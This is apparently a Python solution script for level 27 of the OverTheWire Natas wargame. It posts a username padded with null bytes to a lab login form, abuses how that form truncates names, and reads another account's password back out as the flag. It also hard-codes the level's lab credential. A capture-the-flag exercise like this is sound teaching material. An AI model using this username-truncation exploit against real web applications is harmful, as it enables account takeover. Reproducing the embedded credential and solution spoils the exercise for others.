import requests
import re
import urllib.parse

def flag(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    payload = urllib.parse.unquote('%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00') 
    create = {
            'username':'natas28' + payload + 'A',
            'password':'password'
            }
    create_req = requests.post(url + "index.php",data=create,auth=(username,password))
    login_data = {
            'username':'natas28',
            'password':'password'
            } 
    login = requests.post(url + "index.php",data=login_data,auth=(username,password))
    flag = re.findall("=&gt; (.*)",login.text)
    print("The flag for natas27 is: " + flag[1].strip())

if __name__=="__main__":
    url = "http://natas27.natas.labs.overthewire.org/"
    username = "natas27"
    password = "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3"
    flag(url,username,password)